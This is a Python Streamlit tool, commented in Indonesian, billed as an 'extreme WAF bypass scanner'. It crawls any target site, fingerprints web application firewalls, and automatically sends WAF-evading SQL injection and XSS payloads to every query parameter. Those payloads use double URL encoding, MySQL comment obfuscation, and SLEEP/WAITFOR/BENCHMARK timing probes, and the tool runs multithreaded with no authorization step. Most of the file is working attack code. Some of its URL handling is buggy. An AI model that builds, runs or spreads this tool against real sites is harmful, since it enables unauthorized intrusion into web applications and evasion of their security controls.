import streamlit as st
import requests
import re
import random
import time
import json
from collections import deque, defaultdict
from urllib.parse import urljoin, urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Set, Tuple, Optional
import warnings
warnings.filterwarnings('ignore')

# ================= KONFIGURASI =================
MAX_THREADS = 30
CRAWL_LIMIT = 300
REQUEST_TIMEOUT = 5
RATE_LIMIT_DELAY = 0.05

# ================= DATA CLASSES (HARUS DI AWAL) =================
@dataclass
class Vulnerability:
    url: str
    param: str
    payload: str
    vuln_type: str
    severity: str
    confidence: float
    evidence: str
    response_time: float
    status_code: int
    response_size: int

@dataclass
class ScanResult:
    target: str
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    crawled_urls: List[str] = field(default_factory=list)
    scan_time: float = 0
    waf_detected: bool = False
    waf_names: List[str] = field(default_factory=list)

# ================= PAYLOAD DATABASE =================
SQLI_PAYLOADS_BYPASS = [
    "'%2520OR%2520'1'%2520%253D%2520'1",
    "'%2520UNION%2520SELECT%2520@@version--",
    "0x27204f5220313d3127",
    "%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031",
    "%00' OR 1=1--",
    "'/*!50000OR*/ 1=1--",
    "' OR 1=1/*!00000*/--",
    "id=1&id=' OR 1=1--",
    "' OR SLEEP(2) AND '1'='1",
    "' WAITFOR DELAY '00:00:02'--",
    "' OR IF(1=1, BENCHMARK(5000000,MD5('x')), 0)--",
]

XSS_BYPASS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=\"alert(1)\" />",
    "<svg/onload=alert(1)>",
    "javascrip%74:alert(1)",
]

# ================= WAF DETECTOR =================
class AdvancedWAFDetector:
    def __init__(self):
        self.waf_rules = {
            "Cloudflare": ["cf-ray", "__cfduid", "blocked by cloudflare"],
            "AWS WAF": ["x-amzn-RequestId", "403 Forbidden"],
            "ModSecurity": ["Mod_Security", "406 Not Acceptable"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "Imperva": ["x-iinfo", "incap_ses"],
        }

    def detect(self, response: requests.Response) -> Tuple[bool, List[str]]:
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        detected = []
        for waf, sigs in self.waf_rules.items():
            for sig in sigs:
                if sig in str(headers_lower) or sig in response.text.lower():
                    detected.append(waf)
                    break
        return len(detected) > 0, detected

# ================= ADAPTIVE PAYLOAD GENERATOR =================
class AdaptivePayloadGenerator:
    def __init__(self, waf_type: List[str]):
        self.waf_type = waf_type
        self.bypass_techniques = []
        if "Cloudflare" in waf_type:
            self.bypass_techniques.append(self.double_url_encode)
        if "ModSecurity" in waf_type:
            self.bypass_techniques.append(self.sql_comment_obfuscation)
        if not self.bypass_techniques:
            self.bypass_techniques = [self.double_url_encode, self.sql_comment_obfuscation]

    def double_url_encode(self, payload: str) -> str:
        return quote(quote(payload))

    def sql_comment_obfuscation(self, payload: str) -> str:
        keywords = ['SELECT', 'UNION', 'OR', 'AND']
        for kw in keywords:
            if kw in payload.upper():
                obf = kw[0] + '/*!50000' + kw[1:] + '*/'
                payload = re.sub(kw, obf, payload, flags=re.IGNORECASE)
        return payload

    def generate(self, base_payloads: List[str]) -> List[str]:
        all_payloads = set(base_payloads)
        for payload in base_payloads[:20]:
            for tech in self.bypass_techniques:
                try:
                    all_payloads.add(tech(payload))
                except:
                    pass
        return list(all_payloads)

# ================= TIME-BASED DETECTOR =================
class TimeBasedDetector:
    @staticmethod
    def check_sleep(url: str, param: str, sleep_seconds: int = 3) -> Tuple[bool, float]:
        payload = f"' OR SLEEP({sleep_seconds})--"
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            start = time.time()
            requests.get(test_url, timeout=sleep_seconds+2)
            elapsed = time.time() - start
            return elapsed >= sleep_seconds, elapsed
        except:
            return False, 0

# ================= CRAWLER SEDERHANA =================
class IntelligentCrawler:
    def __init__(self, start_url: str, max_urls: int = 200):
        self.start_url = start_url
        self.max_urls = max_urls
        self.visited = set()
        self.to_visit = deque([start_url])
        self.domain = urlparse(start_url).netloc

    def crawl(self) -> ScanResult:
        result = ScanResult(target=self.start_url)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        while self.to_visit and len(self.visited) < self.max_urls:
            current = self.to_visit.popleft()
            if current in self.visited:
                continue
            self.visited.add(current)
            result.crawled_urls.append(current)
            try:
                resp = requests.get(current, timeout=REQUEST_TIMEOUT, headers=headers)
                links = re.findall(r'href=["\'](.*?)["\']', resp.text)
                for link in links:
                    full = urljoin(current, link)
                    if urlparse(full).netloc == self.domain and full not in self.visited:
                        self.to_visit.append(full)
                time.sleep(RATE_LIMIT_DELAY)
            except:
                pass
        return result

# ================= EXTREME SCANNER =================
class ExtremeWAFBypassScanner:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()
        self.waf_detector = AdvancedWAFDetector()
        self.results = ScanResult(target=target)  # SEKARANG SUDAH TERDEFINISI

    def scan(self) -> ScanResult:
        start_time = time.time()
        st.write("🌐 Phase 1: Crawling")
        crawler = IntelligentCrawler(self.target, max_urls=CRAWL_LIMIT)
        crawl_result = crawler.crawl()
        self.results.crawled_urls = crawl_result.crawled_urls

        if not self.results.crawled_urls:
            st.error("Tidak ada URL ditemukan")
            return self.results

        # Ambil URL pertama dengan parameter
        test_url = None
        test_param = None
        for url in self.results.crawled_urls:
            parsed = urlparse(url)
            if parse_qs(parsed.query):
                test_url = url
                test_param = list(parse_qs(parsed.query).keys())[0]
                break
        if not test_url:
            st.warning("Tidak ada parameter query. Coba URL dengan ?id=1")
            return self.results

        # Deteksi WAF
        st.write("🛡️ Phase 2: WAF Detection")
        try:
            resp = self.session.get(test_url, timeout=5)
            has_waf, waf_names = self.waf_detector.detect(resp)
        except:
            has_waf, waf_names = False, []
        self.results.waf_detected = has_waf
        self.results.waf_names = waf_names
        st.info(f"WAF terdeteksi: {waf_names if waf_names else 'Tidak ada'}")

        # Generate payload
        st.write("⚡ Phase 3: Generate Payloads")
        adapter = AdaptivePayloadGenerator(waf_names)
        payloads = adapter.generate(SQLI_PAYLOADS_BYPASS + XSS_BYPASS)

        # Scan
        st.write("💥 Phase 4: Scanning (Time-based priority if WAF exists)")
        vulnerabilities = []
        use_time_based = has_waf

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for url in self.results.crawled_urls[:50]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params.keys():
                    if use_time_based:
                        futures.append(executor.submit(self.test_time_based, url, param))
                    else:
                        for p in payloads[:20]:
                            futures.append(executor.submit(self.test_payload, url, param, p))

            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulnerabilities.append(vuln)

        self.results.vulnerabilities = vulnerabilities
        self.results.scan_time = time.time() - start_time
        return self.results

    def test_time_based(self, url: str, param: str) -> Optional[Vulnerability]:
        detected, elapsed = TimeBasedDetector.check_sleep(url, param, 3)
        if detected:
            return Vulnerability(
                url=url, param=param, payload="' OR SLEEP(3)--",
                vuln_type="SQL Injection (Time-based Blind)",
                severity="HIGH", confidence=0.95,
                evidence=f"Delay {elapsed:.2f}s",
                response_time=elapsed, status_code=0, response_size=0
            )
        return None

    def test_payload(self, url: str, param: str, payload: str) -> Optional[Vulnerability]:
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
            if resp.status_code != 403:
                if any(x in resp.text.lower() for x in ['error', 'mysql', 'syntax']):
                    return Vulnerability(
                        url=url, param=param, payload=payload,
                        vuln_type="SQL Injection", severity="MEDIUM",
                        confidence=0.7, evidence=resp.text[:200],
                        response_time=resp.elapsed.total_seconds(),
                        status_code=resp.status_code, response_size=len(resp.text)
                    )
        except:
            pass
        return None

# ================= MAIN =================
def main():
    st.set_page_config(page_title="🔥 WAF Bypass Scanner", layout="wide")
    st.title("🔥 EXTREME WAF BYPASS SCANNER v4.1")
    target = st.text_input("Target URL (with parameter)", placeholder="https://example.com/page.php?id=1")
    if st.button("START SCAN"):
        if not target:
            st.error("Masukkan URL")
            return
        if "?" not in target:
            st.warning("URL harus memiliki parameter query, contoh: ?id=1")
        scanner = ExtremeWAFBypassScanner(target)
        with st.spinner("Scanning..."):
            res = scanner.scan()
        st.success(f"Selesai dalam {res.scan_time:.2f}s, ditemukan {len(res.vulnerabilities)} kerentanan")
        for v in res.vulnerabilities:
            st.error(f"**{v.vuln_type}** di parameter `{v.param}` | Confidence {v.confidence:.0%}")

if __name__ == "__main__":
    main()
